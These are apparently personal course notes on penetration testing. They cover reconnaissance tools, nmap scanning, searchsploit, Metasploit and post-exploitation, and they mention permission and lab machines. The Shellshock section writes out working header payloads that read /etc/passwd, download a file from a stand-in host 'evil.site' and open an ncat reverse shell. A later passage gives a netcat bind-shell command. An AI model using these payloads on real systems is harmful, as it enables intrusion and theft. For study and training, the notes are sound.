# Penetration Testing /Ethical Hacking



## Pentesting Tools and Softwares


 **Engagement**
- It is the act of hacking into a company's netework after obtaining permission. It has 5 stages

1. Planning and Reconnaissance /information gathering
2. Scanning
3. Exploitation
4. Post Exploitation
5. Reporting


## Planning and prep for attack


- **Types of Pen Testing**

1. `No view` or `black box` hacking into a company's network by using public internet only tools - detects exposed and visible vulnerability

2. `full view` The company gives full knowlege of the network 

3. `partial view` or `grey box`  testing in house system of network administrator

- Note that understanding the scope is important - you have to clarify with the company which machines and networks are out of scope and must not be attacked. Also ask for the time frame and emergency contacts

- **Info gathering or Reconnaissance**

It can be active (directly engaging with the target system) or passive (Gaining information w/o actively engaging with the system) 

## Common tasks of a pentester

- External/Internal Network
- Web Application
- Wireless - Evaluation of the wireless network
- Physical (Go on site and try to break into the building)/Social/Phishing
- SOC("Purple Teaming") Attacker is read, defender- Its red team vs blue team- called purple teaming assessments- The cat an mouse game
- Report writing

## Useful softwares
 - KeepNote to take notes
 - Green shot or flame shot
 - cherry tree

 ## Networking background

- `ipconfig` for windows `ifconfig` for kali
- NAT
- Media access control (MAC) is the physical address of a device and is in layer 2/ and with switches. 
- The IP addresses are in layer 3. Anythig using a network interface will have a MAC address

## Installations

- Kali linux : 
- VM ware for windows
- 7 zip

- configure virtual machine- VM ware, assign 4GB ram and then select NAT as the network adapter

shortcuts, double tab, ~/
  -  `ls -la` will reveal hidden folders
  -  `ls -la` /tmp/  for checking the permissions of the file inside the temp folder
  -  `chmod 777 filename.txt` or `chmod +x filename.txt` giving full read wrtie execute access
- `cat /etc/passwd`
to change password I can type passwd in the terminal
adding a user to sudoers

 `ifconfig` linux
 `iwconfig`  wireless
 `ipconfig`  windows

- Network commands
   ` ping`
   ` arp -a` associating the ip addresses with mac addresses
`netstat -ano` list all the active connections running on the machine- Is the machine talking to someone else and which ports
- route tells were the traffic exit
ifconfig alternative is ip:
- `ip a`
- `ip n`
- `ip r`

- Updating softwares
-   `apt update && apt upgrade`
-  ` apt install python3-pip`

- install pimp upgrate from cloning a github repository in the 
- cd /opt
- `git clone https://github.com/Dewalt-arch/pimpmykali.git`
- ./pimpmykali.sh

if gedit gives an error then use.
`xhost local:` or `xhost +SI:localuser:root` , the later only fixes the issue for a root user

`ping 192.168.13.2 -c 1 > ip.txt ` - pings one time and then stores in a file
`cat ip.txt | grep "64 bytes"` - This will tell me that the data is being able to be received after ping- so those ip addresses maybe active or accible. 
`cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"` here tr trauncates at the level of first :, d is delimiter which in this case is the space and then we are selecting the 4th time this delimiter is used


## Phyton3

```python


```
## Open Source Information gathering - also the same if you call it OSNIT

- `www.bugcrowd.com` - finding websites to hack who would pay you
- `hunter.io` gives insights regarding the email password
- Heath adams searching the company for datadump from dark web of usernames
- `The harvester` - its built into the Kali linux - It searches information in google
- `sublist3r` app that can be installed: Aids with Searching the subdomains: It is similar to the harvester, but more comprehensive and it is not a built in program. It has to be harvested, for example if i type `sublist3r -d tesla.com -t 100` threadng
Certificate fingerprinting - This also provides information regaring the domains- It can also provide information regaring the sub-sub-domains
- `owasp amass` - can be downloaded using a github repository
tomnomnom httpprobe
- `biltwith.com` info regarding the web technoligies related to the website 
- `wapalyzer` very neat tool gives a nice overview about a website
- `whatweb` - built in Kali linux tools. www.tesla.com
- `Burp suite` - has capability of intercepting web traffic, checkout anoher similar tool `foxy proxy`, we can change the request parameters and then examin the response
goole fu, `site:tesla.com -www filetype:pdf`
Utilizing social media


**OSINT-Open Source Intelligence**

[osintframework.com](osintframework.com) contains freely available public information- and is legal. **port scans**, **bruteforce attacks** and **social engineering** are active and ilegal w/o permission

- On this site `framework-domain name-whois records-Domain Dossier` will lead you to the domain information
- If you check DNS records- it will also give you information regarding the sub-domain
- The **network whois record** provides info regarding the network ip ranges and CIDR (Classless interdomain routing) for network ip ranges
- **DNS records** 

[Google fu](https://www.sans.org/security-resources/GoogleCheatSheet.pdf)

**Google Hacking/Dorking, Shodan and Certificate Transparency**

**Google hacking/dorking**
- Alows the user to find event the webpages that are normally hidden from the user- giving access to sensitive information
- `site:example.com` If you type this in google search - its essentially a sub-domain enumeration task. It can also reveal the file system and assets of the website

**Shodan/ shodan.io** [shodan.io](shodan.io) - Looks up only the machines that are connected to the internet- scans the entire web. You can type in the name of the website in OSINT and then get the ip address an then paste that ip address into the shodan.io
- Looking up DNS (domain naming system) vs DNSSEC (Domain name system security extension - offers more security against DNS information)
- This can lead to methods of hacking including:
- After you are able to find the 

> **Domain hijacking:** redirecting traffic from DNS server to another domain
> **DNS flooding** overewhelming server with malicious requests to prevent legitimate request processing
> **DRDoS** - So the attacker sends many requests to the victim with a spoofed server address resulting in denial of service type of situation

- It can then provide information about the ports

**Certificate transparency/crt.sh** [www.crt.sh](www.crt.sh)
- This provides a lot of top quality information regarding the sub-domains which are associated with certifications

**Recon-Ng - Very important tool** - Combines many OSNIT tools
- It is a Kali linux tool written in Python that combines individual sources including search engines, plugins and APIs to create a report for information gathering
- Commands:
- If not using Kali, you can install it on Ubuntu with `get update && apt-get install recon-ng`
- On Kali linux, first switch to the root user with `sudo su`
- Then type `recon-ng` that will lead to 

```
back            Exits the current context
dashboard       Displays a summary of activity
db              Interfaces with the workspace's database
exit            Exits the framework
help            Displays this menu
index           Creates a module index (dev only)
keys            Manages third party resource credentials
marketplace     Interfaces with the module marketplace
modules         Interfaces with installed modules
options         Manages the current context options
pdb             Starts a Python Debugger session (dev only)
script          Records and executes command scripts
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
workspaces      Manages workspaces
```

- `run` it comes preinstalled in Kali linux
- `help` will show all the commands
- `keys add shodan_api <key>` Go to shodan.io, register with an account to obtain an account specific key
- then check by typing`key list` and  you can remove keys with `keys remove`
- `marketplace install all` Intalls all the modules. You can also install a specific module by specifying the module name instead of 'all' for example: `marketplace install hackertarget` - This module gathers information about 
- `marketplace search` Displays all the currently installed modules. You can also search repos with `marketplace search repos`
- `marketplace info <modulename>` will give specific info regarding that particular module. It also gives the path of the module. For example 

```
[recon-ng][default] > marketplace info hackertarget

  +---------------------------------------------------------------------------------------------------------------+
  | path          | recon/domains-hosts/hackertarget                                                              |
  | name          | HackerTarget Lookup                                                                           |
  | author        | Michael Henriksen (@michenriksen)                                                             |
  | version       | 1.1                                                                                           |
  | last_updated  | 2020-05-17                                                                                    |
  | description   | Uses the HackerTarget.com API to find host names. Updates the 'hosts' table with the results. |
  | required_keys | []                                                                                            |
  | dependencies  | []                                                                                            |
  | files         | []                                                                                            |
  | status        | installed                                                                                     |
  +---------------------------------------------------------------------------------------------------------------+
```

Loading a module
- `modules load recon/hosts-ports/shodan_ip ` - you can find the exact path for this command of a module by typing `marketplace info <modulename>`. Once the module is loaded it will show in the terminal and if you simply type `info` then, it will provide more information

- Alternatively if you know the name of the module you can load it by running `modules load hackertarget`

Running a module to gather info regarding a specific website- or in other words setting 'SOURCE" of data for recon-ng
`options set SOURCE example.com` then type `info` to confirm. To get out of this module type `back`

- Likewise you can load another module called Hackertarget: `modules load recon/domains-hosts/hackertarget` and then set source (every module is independent) and set the source `options set SOURCE <website name>`
- Then `run`

> Example of all the commands to gather info on tesla.com using **hackertarget**

After switching to root and then running `recon-ng` and once you see [recon-ng][default] at the terminal, run the following commands in sequence

- `modules load hackertarget`
- `show options` to see if any website has been set as source already
- `options set SOURCE tesla.com` this should change the terminal to [recon-ng][default][hackertarget]
- `info` It shows that the source has now been set to tesla
- `input` to list the websites that were input
- `run` This gives all the domains and their ip addresses for the website
- `show hosts` will give a summary table of all the info gathered



- Generating a report using **reporting/html** Note that  this report will be based on whatever information was gathered for website previously set in source
- `marketplace install reporting/html` or `marketplace search html` - Note that you should be in the default directory of recon-ng which you can get to by typing `back` first.
- `marketplace search reporting/html` to check if this has been installed
- `modules load reporting/html` to load and `info` to look at the details. Note that you must set the creator and attacker
- `options set CREATOR attacker`
- `options set CUSTOMER Darkweb` and type `info`
- `run` will create the report. It will print the address where the report is located- you just have to copy it after `xdg-open`
- `xdg-open /root/.recon-ng/workspaces/default/results.html` to open the report - note that this is a normal linux command to open file. You will have to `exit` to get out of `reporting/html` program and then type this command for it to work






## Scanning and enumeration - Gathering info about open ports etc

- Note that Metasploit also has some modules for enumeration and they are called **Auxiliary modules** i-e if I choose to use metasploit

www.vulnhub.com. VULNHUB - you can download a vulnerable virtual machine and then load it into VMware and then practice attacking - has various levels of vulnerable machines
kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
- Finding actively running machines and their ip addresses. `ifconfig`  then `netdiscover -r <ip address with subnet>`
`SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection by sending RST in the packet instead of ACK, this gathers info w/o establishing a connection. 
- Modification: `SYN SYNACK RST` - this specification is a trick to reveal port, but not establishing a connection. This is also called a `half-connect scan`

- **nmap** Simply typing nmap in kali will tell you about the various commands you can use along with it

- The main goal of nmap is to determine which ports are open and which OS and services are running on those open ports

`nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports- i-e it will run to check all possible ports to see which one is open, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example `-p 80,443`. `-A` tell me everything (**OS detection, version detection, script scanning and trace route**). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
- Note that -A is the real speed killer here as it is checking for all the versions
`nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
nmap can be used for script scaning, OS detection - other options: version detection, script scanning and trace route if I select -A - it will do all these functions, but is slow. We can also specify the ports. 
- We want to look at what ports are open and whats running on these open ports

- Other useful options include 
-`-pn` will not ping- making the scan faster, 
-`-sT` allows TCP full connect scan which is noisy and detectable- most hackers do not use it
- `-sV` probes for service and version info.
- `-sC` returns the default scripted scan- more results
- `-oN` outputs results in a text file
- `-O` passive OS detection on victim's machine, no data packets are sent
- `-A` active OS detection on victim's machine, it is based on the packets sent
- For example `nmap -sV -sC -oN version.txt 192.168.0.10` This will store the results into a text file called version.txt

- Scanning port for SQL services on port `3306`
- `nmap -sV -sC -p 3306 <victim ip address>` 

- Scanning for IRC (relay chat ) services on port `6667`
- `nmap -sV -sC -p 6667 <victim ip address>`

- Scannng for REMOTE DESKTOP servives on port `5900`
- `nmap -sV -sC -p 5900 <victim ip address>`

- TCP scan of port `445`
- `nmap -sT -p 445 <victim ip address>`

- Syn scan of port `445`
- `nmap -sS -p <victim ip address>`

- UDP scan of port `53`
- `nmap -sU -p 53 < victim ip address>`

- Scans at multiple ports at once: UDP 53, TCP 53, Syn: 53 on the tcp scan
- `nmap -sS -p U:53,T:53 <victim ip address>` 


- We can scan specific ports for example `5900` for remote desktop, `6667` for IRC (Internet Relay Chat) service- a backdoor communicatio channel for botnets and trojan downloaders. If these ports show up as open on the scan its a significant vulnerability

- `zenmap` is a software that makes it easy to examine results of the nmap scan with a user interface

**Other methods of scanning**
- One method is shown above
- massscan
- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1 -65535 <ip address>`

- **Things to look for when you have run the scan**
  - Ping scans
   - Port scans
   - Host scans
   - OS fingerprinting
   - Top port scans
   - Outputting scan results to files
- Look for open ports
- anonymous FTP allowed?
- versions for exploitation such as `SAMBA - SMB` is a network protocol that lets remote computers to connect with servers
- If SSH is open then if you attack it then the company should be able to detect it, attacking SSH makes you noisy. If the blue team of the company is unable to detect then their defences are likely very weak
- OS guesses, may not be accurate initially- you can confirm this after you are able to gain access
- There can be some default webpages for sub-domins- these indicate an opening for a hidden directory maybe for a sub-domain that could be exploited with `drbuster`, `gobuster` etc



**Nmap Scripting Engine NSE** - Comes after an initial scan has been successfully run
- NSE allows creation of custom Nmap scripts for individual needs

- It cannot perform a large number of scans simultaneously and it is not very comprehensive - can miss vulnerabilities

- These are scripts that are run on the results of the initial scan to search the web for what exploits are available

- This is a preinstalled collection of scripts that come with Nmap, about 600
- `ls /usr/share/nmap/scripts` to display the current scripts
- Most scripts are for infomation gathering, but some can be used for automating networking tasks
 - DNS enumeration
   - Brute force attack
   - OS fingerprinting
   - Banner grabbing
   - Vulnerability detection
   - Vulnerability exploitation
   - Backdoor identification
   - Malware discovery


- It is mostly useful for perfoming single host scans and basic information gathering or enumeration
- It does not detect all vulnerabilities and it cannot run multiple scans simultaneously


**Nessus/ Vulnerability scans**
- NSE scan is weaker than a vulnerability scan. An example of vulnerability scan includes Nessus

- these scan the network using a known database of vulnerabilities **National Vulnerability Databse (NBV)** [NVB](nvd.nist.gov), which are rated based on the severity to vulnerability and are assigned a common vulnerability score (CVSS) and category (low, medium, high, critical) of severity based on the score. 

Critical: 10.0.
High: 7.0 - 9.9.
Medium: 4.0 - 6.9.
Low: 0.1 - 3.9.
Info: 0

- In contrast with penetration testing there is no exploitation of weaknesses

- Other vulnerability scans include `Nexpose`-developed by  Rapid7, fully integerted with metasploit, and can be deployed with cloud, and **openVAS**



**Zenmap**

- Its an official Nmap Security GUI (graphical user interface). Update- ok its cool to know that this software exists
but its such a hassal to install- not worth trying- so I am going to pass. The below commands dont work anymore

- ` apt-get update` to update Kali
-  `apt-get install alien` to download zenmap - Note that this is not installation this is just download
- `alien zenmap-7.80-1.noarch.rpm` convert to deb file from rpm before it can be used
- `dpkg -i zenmap_7.80-2_all.deb` this will install zenmap after download

- `apt list --installed | grep alien` to check if it is installed
- 

**Drbuster**
- `http://<ipaddress>:80`, then you supply the wordlist. You are trying to brute force the directories. Then you specify extensions like (asm, asmx, asp, aspx, txt, zip, rar, php-if apache webserver)

**After inspecting the scan findings**

- **Enumerating ports**
- Can start with investigating on ports 80, 443, 139 or the ones that are open
- A tool nikto - It is a web vulnerability scanner - It can also backfire sometimes because if the company's website uses advance security features, it can autoblock
- `nikto -h http://192.168.57.134`. When this scan is run, it will list out a bunch of vulnerabilities. Save the scan findings into a text file
- `dirbuster, gobuster` - this has a list of directories and will scan to detect them. Some of these softwares are built in Kali linux. It can also scan the files. I can use this in conjunction with` burp suite` to intercept traffic. We are looking for what services are being run and what are the versions of the softwares installed. 

Response codes: `200` ok, `400` error, `500` server error, `300` is redirect

- SMB. SMB is a file share. Manages uploading, DL files or sharing files with co-workers. It is important to know what type of SMB version is being used


- **Metasploit**

- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux

   ` Rhosts `- target address, `set RHOSTS 192.168.57.139`and then `run` This refers to remote hosts, hosts are the individual machines in the network

    `Lhosts` - this is the listening host
- **Smbclient** - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal

- connecting to ssh `ssh <ipaddress>` -oKexAlgorithms. We will attempt to connect- goal is to see if there is a banner that can have some information

- Once you identify the vulnerabilities then these can be exploited by searching in google. Basically what you will find is the code on the web that is written to exploit a particular vulnerability

- Another terminal command `searchsploit` What this does is search for the scripts and then downloads. It should not be very specific. This is an additional tool in addition to google- tells about what exploits are available for a given version of OS. For example if I run an nmap scan. It will give me some information about what versions of the software are available on the internet and then I can use type `searchsploit apache 2.18` for example and it will list out all the exploits that are available. 




## Exploitation

Exploitation is a multi-step process. You must:

  1. Identify vulnerabilities. using `searchsploit`

  2. Identify specific exploits that correspond to that vulnerability. Done with `searchsploit`

  3. Prepare and test the exploit payload. Done with `Metasploit:  MSFconsole and Meterpreter` MsFconsole is the main metasploit program that is run on the hacker's compututer. Using Metasploit from the hacker's computer you can then run Meterpreter on the victim's computer after gaining access 

 -  You will use MSFconsole to find vulnerable machines and gain access to them. After you've exploited them, you'll use Meterpreter on the compromised machine. 

- Initial scan can lead to identification of open ports and then it also determins which OS versions are available or which services are being run, in particular file sharing, server applications etc. Then once this information is available I can use search sploit to search for vulnerabilities to exploit. 

**Search Sploit** This is outside metasploit - The metasploitc alternative to searchsploit are **auxillary modules**
- It is a query to find the scripts or payloads available for a given vulnerability
- `Exploit-DB`
- It relies on a database called Exploit-Db
- Exploit-Db is a built-in repository inside Kali-Linux that contains information regarding the publically disclosed exploits based on their `common vulnerability exposure identifier (CVE)`

- In kali linux this repository is already installed, so you can use it even if you are not connected to the internet. But this repository should be updated weeky

- `searchsploit -u` to update the repository, do this weekly

- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline and perform searches offline- it syncs the local repo with the remote repo. Other useful command adjuncts: `-c`(case sensitive), `-e`(exact match), `j`(JSON format), `p`(full path to a file), `t`( search in title), `w`(will provide website in the results), `-x` opens the code file - functions similar to the `less` command

- `searchsploit ftp remote file | wc -l` this will search the database for the words ftp, remote and file. `| wc -l` returns the number of exploits in the search

- `searchsploit linux kernel 4.4 --exclude="(PoC)|/DCCP/"` - can also use to exclude whaever is in ""

- `searchsploit mysql 6.0 -w` `-w` provides the website in results

- `searchsploit shellshock` will show all the shellshock scripts

 - `searchsploit apache | head` head shows only the top 10 results

 - Each of the results will have a path to where the exploit code file is located. For example for the above command the path is `php/remote/29316.py` the path can vary with upgrades. Note that this path shown asumes that you are inside the exploits folder 

 - `searchsploit -x php/remote/29316.py` opens the exploit file. You can type `q` for quit to get out of the file and back to the terminal

 - once the file opens, the exact complete path is displayed at the bottom- copy that. In order to run the exploit you need the complete path, the path mentioned above wont work

 - `python /usr/share/exploitdb/exploits/php/remote/29316.py` This will now run the script and display options

All of this I am still running on my own Kali machine not the victim's machine

 ```
 python /usr/share/exploitdb/exploits/php/remote/29316.py
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
usage: 

  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]
  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]

0pt1ons:

  -h wh1t3h4tz.0rg     | t3st s1ngle h0st f0r vu1n
  -p 80                | t4rg3t p0rt (d3fau1t: 80)
  -S                   | c0nn3ct thr0ugh ss1
  -c 'uname -a;id'     | s3nd c0mm4nds t0 h0st
  -x 192.168.0.2:1337  | c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll
  -s                   | t3st s1ngl3 h0st f0r vu1n
  -r 133.1.3-7.7-37    | sc4nz iP addr3ss r4ng3 f0r vu1n
  -R 1337              | sc4nz num r4nd0m h0st5 f0r vu1n
  -t 2                 | c0nn3ct t1me0ut in s3x (d3fau1t: 3)
  -T 2                 | r3ad t1me0ut in s3x (d3fau1t: 3)
  -f vu1n.lst          | wr1t3 vu1n h0sts t0 f1l3
  -i sc4nz.lst         | sc4nz h0sts fr0m f1le f0r vu1n
  -v                   | pr1nt m0ah 1nf0z wh1l3 sh1tt1ng
```

- I can also add an ip address at the end of the command to run it against that machine: 
- `python /usr/share/exploitdb/exploits/php/remote/29316.py <victim ip address>` or `cd /usr/share/exploitdb/exploits/multiple/remote` then `python 32764.py <victim ip address>` Note that this is 'manual' exploitation w/o using metasploit

- Another example of running payload - `python /usr/share/exploitdb/exploits/linux/remote/34900.py payload=bind rhost=<victim ip address> rport=80 pages=/cgi-bin/vulnerable`

- So far I have only run scans. Gathered Ips and related info on vulnerabilities. Once I have this info now is the time to search for the exploits for these vulnerabilities. 

- This is typically done using `searchsploit` and typing the name of vulnerability to find the payload script

- Then `ncat` is used to establish connection

- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to run scripts on the victim machine)

- Note the difference: Metasploit is run on the hacker's machine, and Meterpreter is run on the victim machine after exploitation is successful. An alternative to Meterpreter are the various payloads available for specific vulnerabilities. I can also create custom payload modules in metasploit

- Tools of exploitation are payload scripts: Shell shock, heart bleed vulnerability ; or Metasploit

**Remote code execution (RCE)**
-  This is the process of runing a bash code during exploitation

**Shell shock Vulnerability**

- Note that this is a vulnerability in the database Exploit-DB, that can be searched using searchsploit

- Shell shock is a software that allows you to execute bash script code on a remote server. This is done by exploiting **common gateway interface** which is a protocol that handles requests for running scripts on the server. 

- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables (controls how processes are run on a computer) into the HTTP header- which can potentially elevate priviliges and allow:

    - Download of sensitive data
    - Send and receive shells to and from the target
    - Backdoor the victim

- Command syntax `/bin/bash -c 'command'`. Note that a code contained in the bash script that is used for exploitation is called **payload**

- you can alter the script using shell shock. For example:


 ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: curl
  Connection: keep-alive
  ```


  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;};
  Connection: keep-alive
  ```

- Likewise you can run malacious code to open passwd file

   - For example: 

   ```bash
   GET /index.html HTTP/1.1
   Host: example.com
   User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
   Connection: keep-alive
   ```

- likewise other ways of exploiting the code include downloading a file from a website
```
     User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'

     -O downloads and saves the file with url name
```

- `searchsploit shellshock` will show all the shellshock scripts


- We can also use this to open a listening port using the ncat command from the victim machine. This is also called opening a reverse shell script. 


- `User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'`

- Other manipulation examples
1. Read `/etc/passwd`.
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'`

2. Use `curl` to download a malicious file from `http://evil.site/mal.php`.
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'`

3. Open a netcat/ncat listener on your host's port `4444`. 
   - Solution: `ncat -lvp 4444`

4. Send a reverse shell to your port 4444 (in this example, use the IP address `192.168.0.8`). 
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'`


- But before this command can be run, a listening port must be open on the host

- `ncat -lvp 4444`



**Payload**
- A payload is an exploit script example is below - This is without using metasploit and doing it manually
- `python /usr/share/exploitdb/exploits/linux/remote/34900.py payload=bind rhost=192.168.0.21 rport=80 pages=/cgi-bin/vulnerable`

- In the above command /usr/share/exploitdb/ is the path displayed in the searchsploit display screen and then the remainder of the path is the part that is next to 

- Here `bind` is used when the ip address of the victim is known. specifies that the victim machine opens up the port for connection with the hacker machine, where `rhost` is the ip address of the victim, same for `rport`

- If you are unsure of the victim's listening port. you can alsouse `nmap -sV <victim ip address>` to determine it



**Heartbleed Vulnerability** CVE-2014-0160
- Its a sensitive data exposure vulnerability - dumps confidential data from RAM- recently used data
- Bleeds memory content from the victim server to the hacker
- Unlike shellshock, heartbleed does not allow remote code execution (RCE)
- Example of bleeds include: encryption keys, user credentials
- Its a bug in the OpenSSL (provides cyptogenic services such as SSL/TLS to clients and servers) hearbeat extention

- When researching about a new vulnerability, questions to ask: What does it do. Which OS versions does it effect, which company was a target. Any pertinent details OpenSSL 


- **Metasploit** - The commands are not case sensitive

- It is preinstalled in Kali linux, to initiate it type `msfconsole`

 - **Auxiliary modules**: Used for information gathering, enumeration, and port scanning. Can also be used for things like connecting to SQL databases and performing man-in-the-middle attacks.

  - **Exploit modules**: Generally used to deliver exploit code to a target system.

  - **Post modules**: Offers post-exploitation tools such as the ability to extract password hashes and access tokens. Provides modules for taking a screenshot, key-logging, and downloading files. You'll explore these during the next class. 

  - **Payload modules**: Used to create malicious payloads to use with an exploit. If possible, the aim is to upload a copy of Meterpreter, which is the default payload of Metasploit.

- The metasploit alternative of searchsploit is the word `search`. Whatever you type after search, metasploit will search for exploits available for it

> **Sequence of commands with Metasploit**

- `msfconsole`
- `search shellshock`
```
msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)                                                                                                                                          
   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)                                                                                                                                        
   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)                                                                                                    
   ```

- `use auxiliary/scanner/http/apache_mod_cgi_bash_env` what use dose is the same as `load` in recon-ng
```
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > 
```
- `info` this provides information about what the module does - note that here we are using the auxillary module, its not an exploit module
- `options` Typing this will inform us about what are the requirements to run this module successfully. The options that do not have the default settings already set and are required must be `set` Like you can see below that CMD, CVE, HEADER, METHOD,RPORT and SSL are already set with default settings but `rhosts` and `targeturi` are not. They are required and must be set

```
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CMD        /usr/bin/id      yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent       yes       HTTP header to use
   METHOD     GET              yes       HTTP method to use
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                   yes       Path to CGI script
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

```
- `set rhosts <victim ip address>`
- `set targeturi /cgi-bin/vulnerable` CGI (Common Gateway Interface) is an interface that enables webservers to execute external programs. The complete path from the root directory in linux is `/usr/lib/cgi-bin/` and by specifying the targeturi we are setting the path to use the exploit module, path where the script file is located
- `run` or `exploit` after running the above commands

- finding stuff: `find -d -iname *cgi*` , `find -d -iname cgi-bin` , `find . -iname flag`

- Thus in a similar way you can run the exploit instead of auxillary, specify the victim ip, and when you run it it will establish a connection 

- When an exploitation is successful with metasploit, it automatically opens a `meterpreter` sesstion with the victim. Meterpreter is short for Meta-Interpreter, it sets up `reverse shells` automatically or you can do that manually using `ncat`

---------------------------------------------------------------------------------------------------------

> below is some repition of above

You can search by the name of the modules for example after metasploit is loaded (with `search java`, `search shellshock`)

 - `exploit/windows/browser/java_cmm` is an exploit module, which delivers the exploit to the target system.
    
 - `auxiliary/scanner/misc/java_jmx_server` is an auxiliary module, used for tasks such as information gathering, enumeration, and port scanning.
    
 - `payload/firefox/gather/cookies` is a payload module. It is the malacious script to be run

 If i want to use a particular module then I can type the `use` command and then the path to whatever module I want to load. This load will runn with the shell shock exploit

 - `auxiliary/scanner/http/apache_mod_cgi_bash_env`


- Next I can type `info` to learn about what the module does, then I can type `options` to get info about the reuired configurations, then I use `set` to set the configurations and then I type `run` or `exploit` to execute the module as below

-`set RHOSTS <victim ip address` This almost always need to be set
-`set TARGETURI /cgi-bin/vulnerable` This is the path to use the exploit module

> Some Additional command to run the shell and finding files using the find command
- Run: `shell` to get the shell command. 
- Run: `cd /` to the current directory to the root directory. 
- Run: `find . -iname flag` to find the flag file. 

>TCM 

- `msfconsole`
- `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
- `sysinfo` This will tell us about the system that we have hacked into
- `systemctl postgresql enable` This will have postgresql running which metasploit needs to run, Even if I do not do it it is fine, as the program will load it anyway, but will be faster otherwise if I do. 

- Typically after running the `nmap` scan you will have info regarding the version of filesystem such as samba- then you google for that version to find code for exploitation. 
- Then you paste that code into metasploit command terminal
- you can then type `options`
- `set rhosts <ip address of victim>` I can also use `setg` instead of `set` toset the rhost ip address globally if I am planning on running multiple modules
- `show targets`
- `run`






- Once you are able to connect. The next step is sending the malware script 


## Post-Exploitation

- Once you are able to break into a victim machine (which means a successful run of metasploit exploit module or manual running of python etc explot script on the `rhost < victim ip address>` ) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - A port is opened on victim to which a hacker is able to connect or **reverse shell** - victim(port) connects to hacker to establish a session (These s **backdoor**). This step can be done without metasploit if we use `Ncat`

- After successful exploitation, `nc` or ncat can be used to establish a backdoor

After the exploit is successful, 

- **bind shell**

- Hacker machine:  `nc <ip address of hacker> 4444` on the hacker kali linux machine, this will allow the victim to connect to hacker

 - Victim Machine:  `nc -lnvp 4444 -e /bin/bash` This command is run on the victim's computer (metasploitable machine) to create a listener port

